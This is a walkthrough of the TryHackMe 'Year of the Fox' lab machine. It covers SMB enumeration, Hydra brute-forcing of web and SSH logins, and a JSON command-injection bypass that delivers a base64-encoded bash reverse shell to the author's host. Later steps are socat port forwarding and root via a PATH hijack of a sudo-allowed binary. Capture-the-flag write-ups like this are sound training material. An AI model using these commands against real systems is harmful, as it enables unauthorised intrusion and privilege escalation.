---
published: true
title: Year of Fox - TryHackMe Walkthrough
image: 'https://imgur.com/RqxE8Cn.png'
category: Writeup
author: F3dai
---
Let's enumerate our first port - 80:

![port 80](https://imgur.com/xT4s0Tg.png)

We are asked for some credentials but I don't have any so far.

I added 10.10.174.149 to my /etc/hosts file as thm.fox.

Let's move onto the next port - 139 and 445. Since this machine is using smb, my spidey senses told me to use enum4linux.

<pre>enum4linux fox.thm</pre>

<pre> ==================================== 
|    Share Enumeration on fox.thm    |
 ==================================== 

	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
</pre>

Let's enumerate users:

<pre>enum4linux -U fox.thm</pre>

<pre> ================================================================== 
|    Users on fox.thm via RID cycling (RIDS: 500-550,1000-1050)    |
 ================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-978893743-2663913856-222388731
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)</pre>

So we have identified 2 users - **rascal** and **fox** as well as 2 shares - **yotf** and **IPC$**. 

From our scans, we know that there is no authentication required:

<pre>[+] Server fox.thm allows sessions using username '', password ''</pre>

However, the shares require authentication. We don't know any credentials as mentioned before. Therefore, we need a different approach.

I attempted to brute-force the web login with user rascal using hydra:

<pre>hydra -l rascal -P /usr/share/wordlists/rockyou.txt fox.thm http-head /</pre>

![hydra](https://imgur.com/xSu2LFf.png)

![web page authenticated](https://imgur.com/undefined)

This appears to be a search engine. I enter some queries in, it only seems to output the following file names:

![search](https://imgur.com/khdvBUc)

I couldn't find a way of viewing these files so my next thought was to test out the actual input itself. I turned on my web proxy and used Burp Suite to intercept the web request:

This is what our request looks like:

<pre>POST /assets/php/search.php HTTP/1.1
Host: fox.thm
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 22
Origin: http://fox.thm
DNT: 1
Authorization: Basic cmFzY2FsOmthd2FzYWtp
Connection: close
Referer: http://fox.thm/

{"target":"something"}</pre>

Maybe we can test to see if this is vulnerable to SQL injection?

I sent the request to intruder, and pasted in a wordlist of SQL injection commands. No luck. 

![SQL attempt](https://imgur.com/sNmbvWz.png)

As you can see, all the responses are the same.

My next thought was testing to see if there is any character sanitisation. This was an interesting response as the input box would immediately remove any special characters such as "\ ; &" ...

If we can't input them on our web browser, let's try and input that via Burp Suite.

This is remote code execution - we need to execute our own command to ideally get a reverse shell. I set up Burp Suite intruder so I could see all the responses immediately. I aimed to essentially execute the following command:

<pre>bash -i >& /dev/tcp/10.9.6.63/4444 0>&1</pre>

Please refer to this article about reverse shells:

[Reverse Shell Cheatsheet](/cheatsheet/Reverse_Payload_Cheatsheet/)

## www-data

After **quite** a few attempts with the repeater and RCE wordlists, I was able to identify a pattern. I need to use \ to escape, then end the command with \n.

<pre>{"target":"\";[COMMAND]\n"}</pre>

So I tried this out with "ls -la":

<pre>{"target":"\";ls -la\n"}</pre>

![burp rce test](https://imgur.com/kLyVDHt.png)

As you can see above, it works. We see the file **search.php** in the web directory.

Set up netcat to listen on port 444:

<pre> nc -nvlp 4444</pre>

Let's replace ls -la with our reverse shell line.

<pre>{"target":"\";bash -i >& /dev/tcp/10.9.6.63/4444 0>&1\n"}</pre>

![invalid char](https://imgur.com/ifulJoy.png)

Invalid character...

We should try to convert this one-liner to base64 and decrypt it when we send the request to bypass the sanitisation. 

<pre>┌─[user@parrot]─[~]
└──╼ $echo "bash -i >& /dev/tcp/10.9.6.63/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjYuNjMvNDQ0NCAwPiYxCg==</pre>

Now let's do the same as before, but replace the reverse shell line with our base64 value:

<pre>{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjYuNjMvNDQ0NCAwPiYxCg== | base64 -d | bash \n"}</pre>

Executing this with Burp Suite successfully gives us a connection with netcat. 

![netcat](https://imgur.com/DNg5Svu.png)

You can find the web flag in the web directory for www.

<pre>cd ~
cat web-flag.txt</pre>

I wanted to have a look at those files we saw from the search engine.

<pre>cd /var/www/files</pre>

The 3 files:

![3 files](https://imgur.com/6UWIs3J.png)

2 of them were empty, but I found something in this file:

**creds2.txt**

<pre>LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX
UTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=</pre>

I feel as if this may be a rabbit hole as I am struggling to decrypt this.

I'll try and use linpeas to gather some more information.

<pre>wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
ifconfig
python -m SimpleHTTPServer 8888</pre>

On target machine:

<pre>cd /tmp
wget http://10.9.6.63:8888/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh</pre>

Have a look at the results. Something should stick out. 

![linpeas](https://imgur.com/cN0VCJd.png)

It says port 22 is open. We didn't see that in our portscan earlier because it's only listening for internal connections.

<pre>127.0.0.1:22</pre>

Maybe we can try and open this up?

## User

Socat is a command-line based utility that establishes bi bidirectional byte streams and transfers data between them.

We can, therefore, use the socat binary to help us open up this port to allow us to connect from our local machine.

[Socat - Github](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

Download the binary and transfer it over using the Python HTTP server. 

<pre>python -m SimpleHTTPServer 8888</pre>

<pre>cd /tmp
wget http://10.9.6.63:8888/socat
chmod +x socat</pre>

Now execute the following to open up port 22 to port 8888. 

<pre>./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22</pre>

Let's see if this has worked. I performed a simple nmap scan:

<pre>nmap fox.thm</pre>

![nmap re scan](https://i.imgur.com/fZ8pCVI.png)

The top is the new scan and the bottom is the old scan. We can see that port 8888 is now open for ssh.

I tried the credentials we already have with rascal, but no luck.

Let's try and brute force this.

<pre>hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://fox.thm:8888</pre>

![hydra ssh](https://i.imgur.com/xS0pM0e.png)

We have a password for the user Fox. Let's connect via ssh with the credentials we just found.

<pre>ssh fox@fox.thm -p 8888</pre>

![ssh valid](https://i.imgur.com/EhBWQgv.png)

## Privilege Escalation

Let's start by seeing our sudo rights:

<pre>fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown</pre>

After doing some research, I couldn't identify any common ways of exploiting this to gain privileged access. There was nothing on GTFOBins either.

Let's transfer this to our local machine to investigate this binary.

On Fox:

<pre>cd /usr/sbin && python3 -m http.server</pre>

On our local machine:

<pre>wget http://fox.thm:8000/shutdown</pre>

Let's start by running strings:

<pre>strings shutdown</pre>

![strings](https://i.imgur.com/r8P8fvk.png)

As highlighted above, I saw that this binary called poweroff. If you run this binary with r2, you can see that poweroff is called upon execution.

Something to note is that this binary is not using an absolute path, which means we may be able to perform privilege escalation using **PATH** Variable.

PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored.

When commands are executed by a user, it essentially requests the binary from terminal with the help of the PATH variable. Here is our PATH variable on Fox's system:

<pre>fox@year-of-the-fox:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</pre>

So let's start this off by copying /bin/bash over to our tmp directory:

<pre>cp /bin/bash /tmp/poweroff</pre>

Then we want to change the PATH variable with the following line to get root:

<pre>sudo "PATH=/tmp:$PATH" /usr/sbin/shutdown</pre>

And that's it. We are root. We successfully manipulated the $PATH variable so our binary /bin/bash would be executed.   

![root](https://imgur.com/mUqUHNM.png)

Turns out the root flag is in rascals home directory. 


